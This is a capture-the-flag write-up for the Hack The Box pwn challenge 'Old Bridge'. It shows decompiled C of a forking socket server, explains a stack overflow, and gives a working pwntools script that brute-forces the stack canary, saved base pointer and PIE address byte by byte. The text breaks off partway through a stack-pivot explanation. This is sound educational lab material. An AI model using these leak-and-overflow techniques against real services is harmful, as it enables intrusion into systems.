<!doctype html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Writeups</title>
        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
        <script type="text/x-mathjax-config">
            MathJax.Hub.Config({
                tex2jax: {
                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
                    processEscapes: true
                },
                config: ["MMLorHTML.js"],
                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
                extensions: ["MathMenu.js", "MathZoom.js"]
            });
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
    </head>
    <body>
        <div id="navbar">
            <a href="/CTF-writeups" id="root-link">
                <h2>Rektedekte</h2>
            </a>
            <ul id="nav-links">
				<li><a href="/CTF-writeups/search" class="no-flash">
					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
				</a></li>
                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
                </a></li>
                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
                </a></li>
                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
                </a></li>
            </ul>
        </div>
        
    <div id="content">
        <h3>
            <a href="/CTF-writeups\HTB\pwn">pwn</a>
            <a href="/CTF-writeups\HTB\pwn\oldbridge/files.zip" class="text-right">Download</a>
        </h3>
        <h1>
            <span>Old Bridge</span>
            <span class="text-right">[60]</span>
        </h1>
        <hr class="no-space">
        
            
    <div class="tags">
        
            
                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
            
        
    </div>

        
        
            <div id="markdown">
                <p>For this challenge, we are given an executable <em>oldbridge</em> and nothing more. I thought that this was quite an interesting challenge, and so, i've decided to do a writeup of it. Let's dig in.</p>
<hr />
<h1>Program analysis</h1>
<h2>main</h2>
<p>The program might initially be a bit confusing, as contrary to the majority of pwn challenges on HTB, this file is not hosted by an external program, but by sockets managed by the <code>main</code> function of the program.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="n">param_2</span><span class="p">)</span><span class="w"></span>

<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">iVar1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">socklen_t</span><span class="w"> </span><span class="n">local_50</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">undefined4</span><span class="w"> </span><span class="n">local_4c</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">local_48</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">undefined4</span><span class="w"> </span><span class="n">local_44</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">local_40</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">__pid_t</span><span class="w"> </span><span class="n">local_3c</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="n">local_38</span><span class="w"> </span><span class="p">[</span><span class="mi">4</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">local_34</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">sockaddr</span><span class="w"> </span><span class="n">local_28</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">undefined8</span><span class="w"> </span><span class="n">local_10</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">local_10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">local_4c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">param_1</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage: %s &lt;port&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="o">*</span><span class="n">param_2</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">local_48</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">((</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
<span class="w">  </span><span class="n">signal</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">exit_server</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">server_sd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">server_sd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;socket&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">setsockopt</span><span class="p">(</span><span class="n">server_sd</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_4c</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iVar1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;setsockopt&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">local_38</span><span class="p">.</span><span class="n">_0_2_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">local_34</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htonl</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">local_38</span><span class="p">.</span><span class="n">_2_2_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">((</span><span class="kt">uint16_t</span><span class="p">)</span><span class="n">local_48</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">local_44</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x10</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bind</span><span class="p">(</span><span class="n">server_sd</span><span class="p">,(</span><span class="n">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">local_38</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iVar1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;bind&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">server_sd</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">listen</span><span class="p">(</span><span class="n">server_sd</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iVar1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;listen&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">server_sd</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">signal</span><span class="p">(</span><span class="mh">0x11</span><span class="p">,(</span><span class="n">__sighandler_t</span><span class="p">)</span><span class="mh">0x1</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">local_50</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x10</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">local_40</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">accept</span><span class="p">(</span><span class="n">server_sd</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_28</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_50</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_40</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;accept&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="n">close</span><span class="p">(</span><span class="n">server_sd</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="n">local_3c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_3c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_3c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">check_username</span><span class="p">();</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iVar1</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">local_40</span><span class="p">,</span><span class="s">&quot;Username found!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">close</span><span class="p">(</span><span class="n">local_40</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">local_40</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;fork&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">local_40</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">server_sd</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>

<p>Overall, function of most of this code is irrelevant to us. The code forks when it receives a connection on the specified fork, after which it executes the <code>check_username</code> function, prints if the <code>check_username</code> return not 0, and then closes the connection.</p>
<h2>check_username</h2>
<div class="codehilite"><pre><span></span><code><span class="kt">bool</span><span class="w"> </span><span class="nf">check_username</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">param_1</span><span class="p">)</span><span class="w"></span>

<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">iVar1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">ssize_t</span><span class="w"> </span><span class="n">sVar2</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">local_420</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">byte</span><span class="w"> </span><span class="n">local_418</span><span class="w"> </span><span class="p">[</span><span class="mi">1032</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_10</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">local_10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">write</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&quot;Username: &quot;</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">sVar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">local_418</span><span class="p">,</span><span class="mi">1056</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">local_420</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">local_420</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar2</span><span class="p">;</span><span class="w"> </span><span class="n">local_420</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_420</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">local_418</span><span class="p">[</span><span class="n">local_420</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_418</span><span class="p">[</span><span class="n">local_420</span><span class="p">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0xd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">iVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memcmp</span><span class="p">(</span><span class="n">local_418</span><span class="p">,</span><span class="s">&quot;il{dih&quot;</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_10</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
<span class="w">    </span><span class="n">__stack_chk_fail</span><span class="p">();</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">iVar1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>

<p><code>check_username</code> is immedietly more akin to what you would find in a traditional challenge. Here, the function takes an input from the user, xors each character by 13, and then compares it to hardcoded value: "il{dih". We also quickly gather, that as a maximum of 1056 characters are stored in a buffer of size 1032, we have a 24 byte overflow, which corresponds to just 3  qwords, as it is a 64-bit executable.</p>
<h2>security measures</h2>
<p>With a seeming lack of leaks in the program, one would except the challenge to be devoid of security features. However, one would be wrong, as the executable features the whole suite of security measures, barring full RELRO.</p>
<div class="codehilite"><pre><span></span><code>gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
</code></pre></div>

<p>However, the way the program is hosted to the user is of great help in this case. As the individual processes serving users are created through forks of the main process, they also inherit a lot from the main process, namely:</p>
<ul>
<li>
<p>The stack canary</p>
</li>
<li>
<p>ASLR address</p>
</li>
<li>
<p>PIE address</p>
</li>
</ul>
<p>They are all inherited, as the child process basically stems from a copy of the parent. So while the program may only give us a single attempt to enter user input, we know that these values will carry over between connections.</p>
<hr />
<h1>Leaking values</h1>
<p>As we can only overwrite 3 stack values after the buffer, we can immediately conclude what these values will be:</p>
<ul>
<li>
<p>The stack canary</p>
</li>
<li>
<p>The return base pointer</p>
</li>
<li>
<p>The return instruction pointer</p>
</li>
</ul>
<p>We know that the return base pointer must be there, as the program makes use of the <code>leave</code> instruction, which is essentially equivalent to the following instructions:</p>
<div class="codehilite"><pre><span></span><code>mov  rsp, rbp
pop  rbp
</code></pre></div>

<p>But this still leaves us without a leak to pursue, until we realize, that as we have the control to partially overwrite these values, we should be able to <em>guess</em> the values, by inferring the programs response.</p>
<p>Suppose we pass in a value, such that the comparison with "il{dih" succeeds: were the program to crash, we would know that our guessed value was incorrect. But if the program returns "Username found!", we would know the guessed value was correct. Combining this with the partial overwrites, we can effectively reduce the problem down to a small bruteforce. The code for this will be shown further down, before then, i would like to see how this can be applied to all 3 values.</p>
<h2>canary</h2>
<p>Applying this to the canary is fairly simple. The canary is comprised of 7 random values, and prefixed with a 0. Thus, we only have to bruteforce 7 characters. If our guess is incorrect, the program will raise a stack fail, and child process will exit.</p>
<h2>Return base pointer</h2>
<p>Applying this same trick to the return base pointer might seem troublesome. The program won't just crash if the value is incorrect, it might continue, just with an invalid base pointer. This is not a problem however, due to the fact that the program uses rbp, to access the fd for the user connection. If the rbp is incorrect, an invalid value will be passed, causing the child process to crash.</p>
<h2>Return instruction pointer</h2>
<p>Another tricky one, this one could actually cause some problems. However, running the program on repeat, we see that it always ends with the same two bytes: 0x0ecf. This makes it easy, ignoring these last two bytes, any incorrect guess would send the program into non-executable or inaccesible memory, causing the child process to crash.</p>
<h2>Code</h2>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./oldbridge&quot;</span><span class="p">)</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1234</span>

<span class="k">def</span> <span class="nf">xor_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>  <span class="c1"># Xors entire payload by some number</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">((</span><span class="n">char</span> <span class="o">^</span> <span class="n">n</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">leak_value</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">known</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">prepad</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">):</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)):</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
            <span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name:&quot;</span><span class="p">)</span>

            <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;il{dih&quot;</span>  <span class="c1"># Initial base to check if the guess is correct</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>  <span class="c1"># Padding to reach desired value</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">prepad</span>  <span class="c1"># Add prepad such as canary</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">leak</span>  <span class="c1"># Add known leaked part</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">i</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;big&quot;</span><span class="p">)[:</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># Add guess</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">xor_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span>  <span class="c1"># XOR entire payload</span>

            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

                <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;found!&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;New byte: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="n">leak</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                    <span class="k">break</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>

            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error!&quot;</span><span class="p">)</span>
            <span class="n">exit</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>

<span class="n">canary</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked stack canary </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">stack_rbp</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">prepad</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked stack rbp </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_rbp</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">rip</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_rbp</span><span class="p">))</span>
<span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">rip</span> <span class="o">-</span> <span class="mh">0x0ecf</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked PIE base </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div>

<p>The following code will leak the three discussed values. When running locally, the program must be running on port 1234. Remotelly, it struggles due to internet stuff, but as the values remain consistent between runs, we can slowly build these values until we have the complete thing.</p>
<hr />
<h1>Exploitation</h1>
<p>With these values leaked, we can start working on our exploit. That might initially seem hard to do, as the program only allows us do one return. With the limited space available, we must <em>pivot</em> to other techniques.</p>
<h2>Stack pivot</h2>
<p>As discussed earlier, <code>leave</code> can be translated into the following code:</p>
<div class="codehilite"><pre><span></span><code>mov  rsp, rbp
pop  rbp
</code></pre></div>

<p>What one might notice, is that we have complete control over what value gets put into rbp. One type of stack pivot, works by using this overwrite to our advantage. Say we overwrite the return base pointer with some value, then overwrite rip as to return to another <code>leave; ret;</code>, the following would happen:</p>
<ul>
<li>
<p>Attacker controlled value gets written into rbp</p>
</li>
<li>
<p>Program returns to <code>leave; ret;</code></p>
</li>
<li>
